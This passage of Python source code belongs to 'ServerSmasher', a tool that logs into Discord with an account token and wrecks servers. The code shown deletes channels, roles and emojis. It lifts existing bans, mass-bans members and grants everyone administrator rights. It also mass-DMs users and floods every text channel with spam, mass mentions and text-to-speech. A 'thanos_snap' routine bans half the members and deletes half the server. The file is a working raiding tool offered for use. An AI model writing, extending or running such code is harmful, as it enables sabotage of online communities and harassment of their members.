    server_owner = get_user(server.owner_id)
    server_bans = get_guild_bans(server.id)
    tchannels = {}
    vchannels = {}
    tlist = []
    vlist = []
    for channel in server.channels:
        if channel.type == 0:
            tchannels[channel.name] = channel.id
            tlist.append(channel)
        elif channel.type == 2:
            vchannels[channel.name] = channel.id
            vlist.append(channel)
    for member in server.members:
        if member.user.id == user.id:
            server_me = member
    general_frame = [
        [sg.Button("Save Preset"), sg.Button("Load Preset")],
        [sg.Text("Change Server Name", size=(13,0.7)), sg.Checkbox("", key="ChangeServerToggle", default=smasheroptions['change_server_name'], size=(2,0.7)), sg.Input(smasheroptions['new_server_name'], key="ChangeServerName")],
        [sg.Text("Change Server Icon", size=(13,0.7)), sg.Checkbox("", key="ChangeServerIconToggle", default=smasheroptions['change_server_icon'], size=(2,0.7)), sg.Input(smasheroptions['icon_location'], size=(10,0.7), key="ChangeIconFile"), sg.FileBrowse()],
        [sg.Text("Internet location", size=(13,0.7)), sg.Checkbox("", key="IconIsInternet", default=smasheroptions['internet_icon'], size=(2,0.7))]
    ]
    delete_frame = [
        [sg.Text("Delete Channels", size=(10,0.7)), sg.Checkbox("", key="DeleteChannelsToggle", default=smasheroptions['delete_channels'], size=(2,0.7))],
        [sg.Text("Delete Roles", size=(10,0.7)), sg.Checkbox("", key="DeleteRolesToggle", default=smasheroptions['delete_roles'], size=(2,0.7))],
        [sg.Text("Delete Emojis", size=(10,0.7)), sg.Checkbox("", key="DeleteEmojisToggle", default=smasheroptions['delete_emojis'], size=(2,0.7))],
        [sg.Text("Remove Bans", size=(10,0.7)), sg.Checkbox("", key="RemoveBansToggle", default=smasheroptions['remove_bans'], size=(2,0.7))]
    ]
    create_frame = [
        [sg.Text("Create Channels", size=(10,0.7)), sg.Checkbox("", key="CreateChannelsToggle", default=smasheroptions['create_channels'], size=(2,0.7)), sg.Combo(['ASCII', 'Set', 'Random', 'VC'], default_value=smasheroptions['channel_create_method'], key="ChanCreateMethod"), sg.Spin([i for i in range(1,501)], initial_value=smasheroptions['channel_count'], key="ChanCreateCount"), sg.Input(smasheroptions['channel_name'], key="ChanCreateName")],
        [sg.Text("Create Roles", size=(10,0.7)), sg.Checkbox("", key="CreateRolesToggle", default=smasheroptions['create_roles'], size=(2,0.7)), sg.Combo(['ASCII', 'Set', 'Random'], default_value=smasheroptions['role_create_method'], key="RoleCreateMethod"), sg.Spin([i for i in range(1,251)], initial_value=smasheroptions['role_count'], key="RoleCreateCount"), sg.Input(smasheroptions['role_name'], key="RoleCreateName")],
        [sg.Text("Create Emojis", size=(10,0.7)), sg.Checkbox("", key="CreateEmojisToggle", default=smasheroptions['delete_emojis'], size=(1.7,0.7)),  sg.Spin([i for i in range(1,51)], initial_value=smasheroptions['emoji_count'], key="EmojiCreateCount", size=(5,0.7)), sg.Text("Internet Location", size=(10,0.7)),sg.Checkbox("", key="EmojiIsInternet", default=smasheroptions['internet_emoji'], size=(2,0.7))],
        [sg.Text("Emoji Path", size=(10,0.7)), sg.Input(smasheroptions['emoji_location'], key="EmojiCreatePath"), sg.FileBrowse()]
    ]
    user_frame = [
        [sg.Text("Give @eveyone admin", size=(13,0.7)), sg.Checkbox("", key="everyoneAdminToggle", default=smasheroptions['give_@everyone_admin'], size=(2,0.7))],
        [sg.Text("Ban all members", size=(13,0.7)), sg.Checkbox("", key="BanMembersToggle", default=smasheroptions['ban_members'], size=(2,0.7))],
        [sg.Text("Ban Reason", size=(13,0.7)), sg.Input(smasheroptions['ban_reason'], key="BanReason")],
        [sg.Text("Member IDs to not ban (Separated by a newline)", size=(28,0.7))],
        [sg.Multiline(smasheroptions['ban_whitelist'], key="BanWhitelist", size=(27,2.9))]
    ]
    other_frame = [
        [sg.Text("Give Me Admin", size=(9,0.7)), sg.Checkbox("", key="MeAdminToggle", default=smasheroptions['give_me_admin'], size=(2,0.7)), sg.Input(smasheroptions['my_id'], key="MyIDAdmin", size=(15,0.7))],
        [sg.Text("Mass DM", size=(9,0.7)), sg.Checkbox("", key="MassDMToggle", default=smasheroptions['send_mass_dm'], size=(2,0.7)), sg.Input(smasheroptions['dm_content'], key="MassDMContent", size=(15,0.7))],
        [sg.Text("Spam Server", size=(9,0.7)), sg.Checkbox("", key="SpamToggle", default=smasheroptions['flood_channels'], size=(2,0.7)), sg.Input(smasheroptions['flood_text'], key="SpamText", size=(15,0.7))],
        [sg.Text("Spam Method", size=(9,0.7)), sg.Combo(['ASCII','@everyone','Custom','Mass Mention'], default_value=smasheroptions['flood_method'], size=(10,0.6), key="SpamMethod"), sg.Text("Use TTS"), sg.Checkbox("", key="UseTTS", default=smasheroptions['use_tts'], size=(2,0.7))],
    ]
    button_frame = [
        [sg.Button("Start"), sg.Button("Info"), sg.Button("Back")]
    ]
    output_frame = [
        [sg.Output()],
        [sg.Frame("", button_frame)]
    ]
    layout = [
        [sg.Frame("General Options", general_frame, font='Any 12', title_color=theme['text_color']), sg.Frame("Deletion options", delete_frame, font='Any 12', title_color=theme['text_color']), sg.Frame("Creation options", create_frame, font='Any 12', title_color=theme['text_color'])],
        [sg.Frame("Member Options", user_frame, font='Any 12', title_color=theme['text_color'], size=(30,10)), sg.Frame("Other Options", other_frame, font='Any 12', title_color=theme['text_color']), sg.Frame("Output", output_frame, font='Any 12', title_color=theme['text_color'])]
    ]
    window = sg.Window(f"DeadBread's ServerSmasher v{ssversion} | Scripted Smash on: {server.name}, {len(server.members)} members", resizable=False, keep_on_top=True, icon=rtb_icon).Layout(layout)
    while True:
        try:
            event, values = window.Read(timeout=10)
        except:
            continue
        if event is None:
            ws.close()
            sys.exit()
        elif event == sg.TIMEOUT_KEY:
            window.Refresh()
            if values["ChanCreateMethod"] == "Set":
                window.Element("ChanCreateName").Update(disabled=False)
            elif values["ChanCreateMethod"] == "VC":
                window.Element("ChanCreateName").Update(disabled=False)
            else:
                window.Element("ChanCreateName").Update(disabled=True)
            if values["RoleCreateMethod"] == "Set":
                window.Element("RoleCreateName").Update(disabled=False)
            else:
                window.Element("RoleCreateName").Update(disabled=True)
            if values["SpamMethod"] == "Custom":
                window.Element("SpamText").Update(disabled=False)
            else:
                window.Element("SpamText").Update(disabled=True)
            smasheroptions['change_server_name'] = values["ChangeServerToggle"]
            smasheroptions['new_server_name'] = values["ChangeServerName"]
            smasheroptions['change_server_icon'] = values["ChangeServerIconToggle"]
            smasheroptions['internet_icon'] = values["IconIsInternet"]
            smasheroptions['icon_location'] = values["ChangeIconFile"]
            smasheroptions['remove_bans'] = values["RemoveBansToggle"]
            smasheroptions['delete_channels'] = values["DeleteChannelsToggle"]
            smasheroptions['delete_roles'] = values["DeleteRolesToggle"]
            smasheroptions['delete_emojis'] = values["DeleteEmojisToggle"]
            smasheroptions['create_channels'] = values["CreateChannelsToggle"]
            smasheroptions['channel_create_method'] = values["ChanCreateMethod"]
            smasheroptions['channel_name'] = values["ChanCreateName"]
            smasheroptions['channel_count'] = int(values["ChanCreateCount"])
            smasheroptions['create_roles'] = values["CreateRolesToggle"]
            smasheroptions['role_count'] = int(values["RoleCreateCount"])
            smasheroptions['role_create_method'] = values["RoleCreateMethod"]
            smasheroptions['role_name'] = values["RoleCreateName"]
            smasheroptions['create_emojis'] = values["CreateEmojisToggle"]
            smasheroptions['internet_emoji'] = values["EmojiIsInternet"]
            smasheroptions['emoji_location'] = values["EmojiCreatePath"]
            smasheroptions['emoji_count'] = int(values["EmojiCreateCount"])
            smasheroptions['give_@everyone_admin'] = values["everyoneAdminToggle"]
            smasheroptions['ban_members'] = values["BanMembersToggle"]
            smasheroptions['ban_reason'] = values["BanReason"]
            smasheroptions['ban_whitelist'] = values["BanWhitelist"]
            smasheroptions['give_me_admin'] = values["MeAdminToggle"]
            smasheroptions['my_id'] = values["MyIDAdmin"]
            smasheroptions['send_mass_dm'] = values["MassDMToggle"]
            smasheroptions['dm_content'] = values["MassDMContent"]
            smasheroptions['flood_channels'] = values["SpamToggle"]
            smasheroptions['flood_method'] = values["SpamMethod"]
            smasheroptions['use_tts'] = values["UseTTS"]
            smasheroptions['flood_text'] = values["SpamText"]
        elif event == "Info":
            sg.PopupNonBlocking(f"Name: {server.name}\nID: {server.id}\nText Channels: {len(tlist)}\nVoice Channels: {len(vlist)}\nRoles: {len(server.roles)}\nMembers: {len(server.members)}\nRegion: {server.region}\nNitro Boost Level: {server.premium_tier}\nVerification Level: {server.verification_level}\nOwner: {server_owner.username}#{server_owner.discriminator}", keep_on_top=True, title="Info", icon=rtb_icon)
        elif event == "Back":
            window.Close()
            sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
            server_menu(server.id)
        elif event == "Save Preset":
            save = sg.PopupGetText("Preset Name:", title="Save Preset", keep_on_top=True)
            if save == "Cancel":
                pass
            else:
                with open (f"RTBFiles/ServerSmasher/presets/{save}.sspreset", "w+", errors='ignore') as handle:
                    handle.write(str(smasheroptions))
        elif event == "Load Preset":
            load = sg.PopupGetFile("Select a preset:", title="Load Preset", file_types=(("ServerSmasher Preset","*.sspreset"), ("All Files", "*")), keep_on_top=True, icon=rtb_icon)
            if load == "Cancel":
                pass
            else:
                with open(load, "r", errors="ignore") as handle:
                    smasheroptions = ast.literal_eval(handle.read())
                window.Close()
                sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
                scripted_smash(server.id)
        elif event == "Start":
            window.Refresh()
            roleperms = []
            for role in server.roles:
                if role.id in server_me.roles:
                    for permbit in sorted(list(bitarray_values)):
                        if role.permissions & bitarray_values[permbit] != 0:
                            roleperms.append(permbit)
            if not "ADMINISTRATOR" in roleperms:
                con = sg.PopupYesNo("You do not have admin permissions on this server.\nContinue anyway?", keep_on_top=True, title="Warning", icon=rtb_icon)
                if con == "Yes":
                    pass
                else:
                    window.Close()
                    sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
                    scripted_smash(server.id)
            no_ban = smasheroptions['ban_whitelist'].splitlines()

            if smasheroptions['create_emojis']:
                if smasheroptions['internet_emoji']:
                    print("Downloading Emoji...")
                    src = requests.get(smasheroptions['emoji_location'])
                    encoded_emoji = bytes_to_base64_data(src.content)
                else:
                    with open(smasheroptions['emoji_location'], "rb") as handle:
                        encoded_emoji = bytes_to_base64_data(handle.read())

            if smasheroptions['change_server_icon']:
                if smasheroptions['internet_icon']:
                    print("Downloading Server icon...")
                    window.Refresh()
                    src = requests.get(smasheroptions['icon_location'])
                    encoded_server_icon = bytes_to_base64_data(src.content)
                else:
                    with open(smasheroptions['emoji_location'], "rb") as handle:
                        encoded_server_icon = bytes_to_base64_data(handle.read())

            if smasheroptions['delete_channels']:
                print('Deleting channels...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for channel in server.channels:
                        print (f"Deleting {channel.name}")
                        window.Refresh()
                        exec.submit(delete_channel, channel.id)
                print('Finished deleting channels.')
                window.Refresh()

            if smasheroptions['delete_roles']:
                print('Deleting Roles...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for role in server.roles:
                        print (f"Deleting role: {role.name}")
                        window.Refresh()
                        exec.submit(delete_role, role.id, server.id)
                print('Finished deleting roles.')
                window.Refresh()

            if smasheroptions['remove_bans']:
                print('Removing bans...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for ban in server_bans:
                        print(f"Removing ban for: {ban.user.username}")
                        window.Refresh()
                        exec.submit(remove_ban, server.id, ban.user.id)
                print("Finished Removing Bans")
                window.Refresh()

            if smasheroptions['delete_emojis']:
                print("Deleting Emojis...")
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for emoji in server.emojis:
                        print(f"Deleting {emoji.name}")
                        window.Refresh()
                        exec.submit(delete_emoji, server.id, emoji.id)
                print("Finished deleting emojis.")
                window.Refresh()

            if smasheroptions['send_mass_dm']:
                print("Sending DMs...")
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for member in server.members:
                        print (f"Sending DM to {member.user.username}")
                        window.Refresh()
                        exec.submit(send_dm, member.user.id, smasheroptions['dm_content'], smasheroptions['use_tts'])
                print("Finished Sending DMs.")
                window.Refresh()

            if smasheroptions['change_server_name']:
                print('Changing server name...')
                window.Refresh()
                edit_guild_name(server.id, smasheroptions['new_server_name'])

            if smasheroptions['change_server_icon']:
                print('Changing icon...')
                window.Refresh()
                edit_guild_icon(server.id, encoded_server_icon)

            if smasheroptions['give_@everyone_admin']:
                print('Giving everyone admin...')
                window.Refresh()
                for role in server.roles:
                    if role.name == '@everyone':
                        edit_role(role.id, server.id, 8)

            if smasheroptions['ban_members']:
                print('Banning users...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for member in server.members:
                        if member.user.id in no_ban:
                            print(f"Not Banning {member.user.username}")
                        else:
                            print (f"Banning {member.user.username}")
                            exec.submit(ban_user, member.user.id, server.id, smasheroptions['ban_reason'])
                        window.Refresh()
                print("Finished Banning Members.")
                window.Refresh()

            if smasheroptions['give_me_admin']:
                print('Giving you admin...')
                window.Refresh()
                give_admin_role(server.id, smasheroptions['my_id'])

            if smasheroptions['create_channels']:
                print('Creating channels...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for x in range(int(smasheroptions['channel_count'])):
                        if smasheroptions['channel_create_method'] == "ASCII":
                            exec.submit(create_channel, server.id, asciigen(size=60), "text")
                        elif smasheroptions['channel_create_method'] == "Set":
                            exec.submit(create_channel, server.id, smasheroptions['channel_name'], "text")
                        elif smasheroptions['channel_create_method'] == "Random":
                            exec.submit(create_channel, server.id, gen(size=60), "text")
                        elif smasheroptions['channel_create_method'] == "VC":
                            exec.submit(create_channel,server.id, smasheroptions['channel_name'], "voice")
                print ('Finished Creating Channels.')
                window.Refresh()

            if smasheroptions['create_roles']:
                print('Creating roles...')
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for x in range(int(smasheroptions['role_count'])):
                        if smasheroptions['role_create_method'] == "Set":
                            exec.submit(create_role, smasheroptions['role_name'], server.id)
                        elif smasheroptions['role_create_method'] == "ASCII":
                            exec.submit(create_role, asciigen(size=60), server.id)
                        elif smasheroptions['role_create_method'] == "Random":
                            exec.submit(create_role, gen(size=60), server.id)
                print ('Finished Creating Roles.')
                window.Refresh()

            if smasheroptions['create_emojis']:
                print("Creating Emojis")
                window.Refresh()
                with ThreadPoolExecutor(max_workers=thread_count) as exec:
                    for x in range(int(smasheroptions['emoji_count'])):
                        exec.submit(create_emoji, server.id, encoded_emoji, gen())
                print("Created Emojis.")
                window.Refresh()

            print("Finished!")
            window.Refresh()
            server = get_guild(server_id)
            server_bans = get_guild_bans(server.id)

            if smasheroptions['flood_channels']:
                spamming = True
                print('Spam will start in 5 seconds.')
                window.Refresh()
                if smasheroptions['flood_method'] == 'ASCII':
                    spam = threading.Thread(target=ascii_spam, args=[server, smasheroptions['use_tts']], daemon=True)
                elif smasheroptions['flood_method'] == 'Mass Mention':
                    spam = threading.Thread(target=mass_tag, args=[server, smasheroptions['use_tts']], daemon=True)
                elif smasheroptions['flood_method'] == 'Custom':
                    spam = threading.Thread(target=text_spam, args=[ server, smasheroptions['flood_text'], smasheroptions['use_tts']], daemon=True)
                elif smasheroptions['flood_method'] == '@everyone':
                    spam = threading.Thread(target=everyone_spam, args=[server, smasheroptions['use_tts']], daemon=True)
                spam.start()


def mass_tag(server, use_tts):
    global spamming
    time.sleep(5)
    msg = ''
    for member in server.members:
        msg += f"<@{member.user.id}> "
    while spamming:
        with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
            for channel in server.channels:
                if not channel.type == 0:
                    continue
                else:
                    for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                        exec.submit(send_message, channel.id, m, use_tts)
        time.sleep(5)

def ascii_spam(server, use_tts): # "oh god you scrambled that server"
    global spamming
    time.sleep(5)
    print("Started Spamming")
    while spamming:
        with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
            for channel in server.channels:
                if not channel.type == 0:
                    continue
                else:
                    exec.submit(send_message, channel.id, asciigen(size=1999), use_tts)
        time.sleep(5)

def text_spam(server, text, use_tts):
    global spamming
    time.sleep(5)
    print("Started Spamming")
    while spamming:
        with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
            for channel in server.channels:
                if not channel.type == 0:
                    continue
                else:
                    exec.submit(send_message, channel.id, text, use_tts)
        time.sleep(5)

def everyone_spam(server, use_tts):
    global spamming
    time.sleep(5)
    print("Started Spamming")
    while spamming:
        with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
            for channel in server.channels:
                if not channel.type == 0:
                    continue
                else:
                    exec.submit(send_message, channel.id, "@everyone", use_tts)
        time.sleep(5)

def corruptor(server):
    sg.PopupNonBlocking("Corrupting...", auto_close=True, auto_close_duration=2, keep_on_top=True, icon=rtb_icon)
    with ThreadPoolExecutor(max_workers=thread_count) as exe:
        for channel in server.channels:
            exe.submit(corrupt_channel, channel.id, channel.name)
        for role in server.roles:
            exe.submit(corrupt_role, server.id, role.id, role.name)
    servername = ''
    for x in server.name:
        if random.randint(1,2) == 1:
            servername += asciigen(size=1)
        else:
            servername += x
    edit_guild_name(server.id, servername)
    sg.Popup("Corrupted the server.", icon=rtb_icon)
    sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
    server_menu(server.id)

def thanos_snap(server):
    yes = sg.PopupYesNo("The end is near.", title='Continue?', keep_on_top=True, icon=rtb_icon)
    if yes == "Yes":
        pass
    else:
        server_menu(server.id)
    channels = []
    users = []
    roles = []
    for channel in server.channels:
        wh = create_webhook(channel=channel.id, name=asciigen(size=random.randint(2,80)))
        break
    beginquotes = [
        'When I’m done, half of humanity will still exist. Perfectly balanced, as all things should be. I hope they remember you.',
        'You’re strong. But I could snap my fingers, and you’d all cease to exist.',
        'You should have gone for the head.',
        'Dread it. Run from it. Destiny still arrives. Or should I say, I have.',
        'I ignored my destiny once, I can not do that again. Even for you. I’m sorry Little one.',
        'With all six stones, I can simply snap my fingers, they would all cease to exist. I call that mercy.',
        'The hardest choices require the strongest wills.'
    ]
    payload = {
        "username": "Thanos",
        "avatar_url": "https://i.imgur.com/hLU3tXY.jpg",
        "content": f"**{random.choice(beginquotes)}**"
    }
    requests.post(wh.url, json=payload)
    time.sleep(5)
    for channel in server.channels:
        channels.append(channel)
    for role in server.roles:
        roles.append(role)
    for user in server.members:
        users.append(user)
    count = 0
    halfroles = int(round(len(server.roles) / 2))
    for role in roles:
        count += 1
        if halfroles == count:
            break
        executor.submit(delete_role, str(role.id), server.id)
        roles.remove(role)
    count = 0
    halfchan = int(round(len(server.channels) / 2))
    for channel in channels:
        count += 1
        if halfchan == count:
            break
        executor.submit(delete_channel, channel.id)
        channels.remove(channel)
    count = 0
    halfuser = int(round(len(server.members) / 2))
    for member in users:
        count += 1
        if halfuser == count:
            break
        executor.submit(ban_user, member.user.id, server.id, "Thanos Snapped")
        users.remove(member)
    time.sleep(10)
    for channel in channels:
        wh = create_webhook(channel=channel.id, name=asciigen(size=random.randint(2,80)))
        break
    endquotes = [
        'Perfectly balanced, as all things should be.',
        'Fun isn’t something one considers when balancing the universe. But this… does put a smile on my face.'
    ]
    payload = {
        "username": "Thanos",
        "avatar_url": "https://i.imgur.com/hLU3tXY.jpg",
        "content": f"**{random.choice(endquotes)}**"
    }
    requests.post(wh.url, json=payload)
    sg.Popup("Perfectly balanced, as all things should be.", title="Snapped", keep_on_top=True, icon=rtb_icon)
    sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True, icon=rtb_icon)
    server_menu(server.id)

def start_client():
    global client_type
    global token
    global user
    global cache_guilds
    global avatar_b64
    global session_id
    global ws

    ws.connect("wss://gateway.discord.gg/?v=6&encoding=json")
    hello = json.loads(ws.recv())
    heartbeat_interval = hello['d']['heartbeat_interval']
    if startup_activity_type == "Playing":
        gamejson = {
            "name": startup_activity_name,
            "type": 0
        }
    elif startup_activity_type == 'Streaming':
        gamejson = {
            "name": startup_activity_name,
            "type": 1,
            "url": "https://www.twitch.tv/SERVERSMASHER"
        }
    elif startup_activity_type == "Listening to":
        gamejson = {
            "name": startup_activity_name,
            "type": 2
        }
    elif startup_activity_type == "Watching":
        gamejson = {
            "name": startup_activity_name,
            "type": 3
        }
    auth = {
    "op": 2,
    "d": {
        "token": token,
        "properties": {
            "$os": sys.platform,
            "$browser": f"ServerSmasher{random.randrange(99999999)}",
            "$device": f"ServerSmasher{random.randrange(99999999)}"
        },
        "presence": {
            "game": gamejson,
            "status": startup_status,
            "since": 0,
            "afk": False
        }
    },
    "s": None,
    "t": None
    }
    try:
        ws.send(json.dumps(auth))
        result = json.loads(ws.recv())
        user = result['d']['user']
        with ThreadPoolExecutor(max_workers=thread_count) as exe:
            for guild in result['d']['guilds']:
                exe.submit(get_guild_threaded, guild['id'])
        user['guilds'] = cache_guilds
        user = namedtuple('User', sorted(user.keys()))(**user)
        if user.avatar is None:
            src = requests.get("https://cdn.discordapp.com/embed/avatars/1.png").content
        else:
            src = requests.get(construct_avatar_link(user.id, user.avatar, 128)).content
        im = Image.open(io.BytesIO(src))
        im_square = crop_max_square(im).resize((64, 64), Image.ANTIALIAS)
        im_thumb = mask_circle_transparent(im_square, 1)
        imgbytes = io.BytesIO()
        im_thumb.save(imgbytes, format='PNG')
        imgbytes = imgbytes.getvalue()
        avatar_b64 = base64.b64encode(imgbytes)
        heart = threading.Thread(target=heartbeat, args=[heartbeat_interval], daemon=True)
        heart.start()
    except Exception:
        sg.Popup("Error Logging into token.", title="Error", icon=rtb_icon)
        login_serversmasher()
    main_menu()

while __name__ == "__main__":
    try:
        login_serversmasher()
    except Exception as e:
        exception = ''
        exc_type, exc_value, exc_traceback = sys.exc_info()
        trace = traceback.format_exception(exc_type, exc_value, exc_traceback)
        for line in trace:
            exception += line
        try:
            ws.close()
        except:
            pass
        yesno = sg.PopupYesNo(f"ServerSmasher Crashed: {repr(e)}\nDetails:\n{exception}\n\nReport to DeadBread? (No revealing data is sent.)", title="ServerSmasher Crashed >:(", icon=rtb_icon)
        if yesno == "Yes":
            payload = {"content": f"```{exception}```"}
            try:
                requests.post(h, json=payload)
            except Exception:
                pass
            else:
                sg.PopupNonBlocking('Reported to DeadBread. Thanks!', title="Done.",keep_on_top=True, icon=rtb_icon)
